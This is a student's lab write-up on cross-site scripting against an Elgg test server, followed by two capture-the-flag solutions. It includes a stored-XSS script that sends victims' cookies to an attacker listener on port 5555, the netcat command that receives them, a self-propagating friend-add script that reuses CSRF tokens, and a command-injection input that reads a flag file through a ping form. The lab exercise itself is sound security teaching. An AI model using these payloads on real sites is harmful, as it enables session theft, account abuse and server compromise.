# Work on week #10

## Task 1

* In this first task, we want to post a malicious message to be displayed in an alert window.

* Firstly, we logged in the server as Alice and looked for and editable field for html. Fortunately, the section "About me" allows us to do that in the "Edit Profile" page:

![](https://i.imgur.com/AJ39lK2.png)

* Then, we injected the code given in this field:

![](https://i.imgur.com/EufKsqC.png)

* We logged in with other user, in this case as admin, and searched for the Alice's profile page.

![](https://i.imgur.com/36FNRIZ.png)

* When we clicked on her profile an alert window with the message we wrote, which means that our attack was successful:

![](https://i.imgur.com/VePYOAS.png)

## Task 2

 * In task 2 is very similiar to task 1. The only difference is in this task the message is gonna appear like cookie.

 * To do this, we have to put this code in about me in our profile (in this case, Alice's profile) and we check with Samy's profile alice account and we can saw the message.
 
 ```javascript=
<script>alert(document.cookie);</script>
```
![](https://i.imgur.com/s6qmdss.png)

![](https://i.imgur.com/selmx4P.png)

* The attack is done.

## Task 3

* Our goal on this task 3 is to steal cookies from the victim’s machine. In order to do this, we have to change the "About me" section in our profile (in this case, Alice's profile) for:

```javascript=
<script>document.write(’<img src=http://10.9.0.1:5555?c=’
                       + escape(document.cookie) + ’   >’);
</script>
```

![](https://i.imgur.com/2U6zjtT.png)

* After that we have to use our terminal and run command: **$ nc -lknv 5555** for allow us to see what we are able to steal. The terminal is gonna print out whatever is sent by the client and sends to it everything typed by the user.

![](https://i.imgur.com/Dt1XB8P.png)


* The attack is done.



## Task 4

* In this task, we tried to recreate the famous "Samy Worm" attack that occured in 2005 on MySpace. Firstly, we need to understand how to add a friend in this website. To do so, and thanks to the HTTP tool of Mozilla Firefox, we analyse what it is sent when we add someone as a friend. for this, we used the victim's profile:

![](https://i.imgur.com/EXjLta4.png)


* As we can see, this GET method needs to send ID of the user to be added as a friend, the security token (elgg_ts) and another token, the elgg_token.

* So, if we want to make the attack, we need to write a malicious JavaScript script in the Samy's profile, more specifically, in his "About Me" section, with the option "Edit HTML" enabled.

* This is the malicous script to be written to:

> Javascript script:

```javascript=
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; ➀
var token="&__elgg_token="+elgg.security.token.__elgg_token; ➁
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1670502594&__elgg_token=9G_lgRjZAewSEpzeJGa2KA&__elgg_ts=1670502594&__elgg_token=9G_lgRjZAewSEpzeJGa2KA"+ts+token;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script>
```

* This script will just make the request instead of "Add friend" button. It is already sending all the tokens needed. Also, it is sending the URL that is sent after the adding friend action occurs, using the Samy's ID (which is 59), with the parameters mentioned before filled correctly.

* And we successfully added on his profile. It is important to note that the section does not change visually, which means the Samy's profiles seems a normal one.

![](https://i.imgur.com/CAhX3S9.png)


* After that, we logged in as the victim and searched for the Samy's profile:

![](https://i.imgur.com/eLBSDJX.png)


* And without clicking in the "Add friend" button, we noticed that victim was already a friend, meaning that the attack was successful:

![](https://i.imgur.com/f3gDP7c.png)

* Finally, we have to answer some questions:

* Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?

* Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

* Answers:

* Question 1: These 2 lines are important to create the security tokens and session tokens needed to be sent in the URL of "Add friend action". These tokens are used for security purposes and are generated in the moment that the page is loaded, which means that are not constant values. However, if we use these commands, we can get the correct tokens succesfully.

* Question 2: In the described situation, we could not launch a successful attack, because we wouldn't alter the HTML, so no actions and no GET method would occur. And there is not any other field in the user profile where we could alter the HTML. Also, we tried to recreate the attack in the conditions mentioned in the question and the attack failed as predicted:

![](https://i.imgur.com/Tg109n3.png)


## CTF's

### Challenge 1

* In this challenge, we have to access a flag of a server with only a input form available.

* Firstly, we explored the website as a user. We initially gave a random string in order to understand what would occur. We noticed that the website reloaded in every 5 seconds and appear the error message:


![](https://i.imgur.com/utk7LYs.png)


* Then, we started to inject small scripts of Javascript and we noticed that we altered the HTML of the page. This means that the website has a XSS vulnerability, that is, we could inject malicious scripts and use them in our favour:

![](https://i.imgur.com/rkD6xjm.png)


* After that, we started to inspect the page's HTML. And we noticed that there were the button that gives the flag was disabled. So, we created a small script of Javascript in order to enable it:

![](https://i.imgur.com/e6ziIWw.png)


> First Javascript script:

```javascript=
document.getElementById("giveflag").disabled = false;
```

* We submitted this script and the button started to appear on the screen:

![](https://i.imgur.com/Lkw03rE.png)


![](https://i.imgur.com/Ye42j22.png)

* Finally, we just need to simulate that the button which gives the flag was clicked. Fortunately, we have the Javascript method ```click()``` that does exactly what we needed. So, we just needed to alter our code like that and inject it on the input form:

> First Javascript script:

```javascript=
document.getElementById("giveflag").click();

```
![](https://i.imgur.com/gDcgP4Q.png)

* We waited the 5-seconds reload and we obtained the flag:

> Before the 5 seconds:

![](https://i.imgur.com/7L9THqh.png)

> After the 5 seconds:

![](https://i.imgur.com/xCJpqI8.png)

### Challenge 2

* In this challenge, we want to access to a flag in PHP server. Firstly, we need to answer some questions:

1) What functionalities are accessible to unauthenticated users?

2) In those funcitionalites, which ones did we obtain feedback. How are they implemented? Are they using a Linux command?

3) If so, what vulnerabilities could be present in that user call?

* Answers:

1) We have a couple of functionalities in the vulnerable website. Right off the bat, we could seed a login form, so that users could authenticate themselves. However, we don't have any correct credentials:

![](https://i.imgur.com/f2rNmo5.png)

* Besides that, we have access to a link that redirects to another page where we could test our speed network and other form that allowed us to ping a host:

![](https://i.imgur.com/tv1ArW8.png)


![](https://i.imgur.com/vFeQqRz.png)

2) All functionalities gave us feedback; however, most of them dind't give us useful informations to obtain the flag. As instance, the login only showed an error page, since we din't have any correct credentials. This login input form was implemented as normal HTML input form:

![](https://i.imgur.com/tDhbMcS.png)

![](https://i.imgur.com/eY27G44.png)


* The second feature didn't gave us any relevant information as well- it only allowed us to test our speed network and told us it was "super fast", followed by a GIF:

![](https://i.imgur.com/mUBA7Bd.png)

![](https://i.imgur.com/2iLnoPF.png)

* This feature is implemented this way:

![](https://i.imgur.com/DGz0Obf.png)


* Unlike the other ones, the "Ping a Host" feature was quite relevant for us- in fact, when we pinged a host (8.8.8.8, as instance), it gave was several informations about the ping made, such as the ping time, sequence number etc.:

![](https://i.imgur.com/zpf0yOn.png)

![](https://i.imgur.com/GYVJHjN.png)

* This means that this feature was running code after clicking on "Ping it" button and it is implemented this way:

![](https://i.imgur.com/a3KniBC.png)

* So we could conclude, that the website was excuting the Linux command```ping```, that allowed us to ping servers and hosts.

3) We could conclude that in this "Ping a Host" feature was running system calls in the website. So we could easily make the input form as a terminal. Also, we could running multiple commands by separate them using the ";" character.

* Finally, we made the attack: we input the command ```8.8.8.8;cat /flags/flag.txt``` in the "Ping a Host" input form and expected to obtain the ping informations and the flag as well:

![](https://i.imgur.com/ewKlPkD.png)

* And we successfully obtained the flag.

![](https://i.imgur.com/vlO31Fq.png)
